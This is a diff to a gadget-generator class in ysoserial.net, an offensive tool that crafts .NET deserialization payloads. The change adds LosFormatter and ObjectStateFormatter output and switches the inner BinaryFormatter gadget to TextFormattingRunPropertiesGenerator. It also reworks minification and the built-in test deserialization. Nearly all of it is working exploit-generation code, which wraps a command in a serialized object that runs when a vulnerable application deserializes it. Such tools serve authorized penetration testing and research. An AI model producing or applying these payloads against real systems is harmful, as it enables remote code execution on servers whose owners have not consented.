@@ -6,6 +6,7 @@ using System.Security.Principal;
 using System.Xml;
 using Newtonsoft.Json;
 using System.Runtime.Serialization.Formatters.Soap;
+using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
@@ -36,7 +37,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter"};
+            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "ObjectStateFormatter" };
         }
 
         public override string Name()
@@ -47,6 +48,11 @@ namespace ysoserial.Generators
         public override string Credit()
         {
             return "Levi Broderick, updated by Soroush Dalili";
+        }
+
+        public override bool isDerived()
+        {
+            return true;
         }
 
         [Serializable]
@@ -66,16 +72,18 @@ namespace ysoserial.Generators
             }
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
+        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
         {
-            Generator binaryFormatterGenerator = new TypeConfuseDelegateGenerator();
-            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false, minify);
+            Generator generator = new TextFormattingRunPropertiesGenerator();
+            byte[] binaryFormatterPayload = (byte[])generator.Generate(cmd, "BinaryFormatter", false, minify, useSimpleType);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
-            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
+            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new IdentityMarshal(b64encoded);
-                return Serialize(obj, formatter, test, minify);
+                return Serialize(obj, formatter, test, minify, useSimpleType);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
@@ -86,17 +94,14 @@ namespace ysoserial.Generators
 
                 if (minify)
                 {
-                    payload = Helpers.JSONMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                    payload = JSONMinifier.Minify(payload, new string[] { "mscorlib" }, null);
                 }
 
                 if (test)
                 {
                     try
                     {
-                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
-                        {
-                            TypeNameHandling = TypeNameHandling.Auto
-                        });
+                        SerializersHelper.JsonNet_deserialize(payload);
                     }
                     catch
                     {
@@ -114,18 +119,21 @@ namespace ysoserial.Generators
 ";
                 if (minify)
                 {
-                    payload = Helpers.XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                    if (useSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null);
+                    }
                 }
 
                 if (test)
                 {
                     try
                     {
-                        var xmlDoc = new XmlDocument();
-                        xmlDoc.LoadXml(payload);
-                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
-                        var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
-                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
                     }
                     catch
                     {
@@ -143,18 +151,21 @@ namespace ysoserial.Generators
 ";
                 if (minify)
                 {
-                    payload = Helpers.XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                    if (useSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null);
+                    }
                 }
 
                 if (test)
                 {
                     try
                     {
-                        var xmlDoc = new XmlDocument();
-                        xmlDoc.LoadXml(payload);
-                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
-                        var s = new NetDataContractSerializer();
-                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                     }
                     catch
                     {
@@ -174,17 +185,21 @@ namespace ysoserial.Generators
 ";
                 if (minify)
                 {
-                    payload = Helpers.XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null, Helpers.FormatterType.SoapFormatter);
+                    if (useSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null, FormatterType.SoapFormatter);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
+                    }
                 }
 
                 if (test)
                 {
                     try
                     {
-                        byte[] byteArray = System.Text.Encoding.ASCII.GetBytes(payload);
-                        MemoryStream ms = new MemoryStream(byteArray);
-                        SoapFormatter sf = new SoapFormatter();
-                        sf.Deserialize(ms);
+                        SerializersHelper.SoapFormatter_deserialize(payload);
                     }
                     catch
                     {
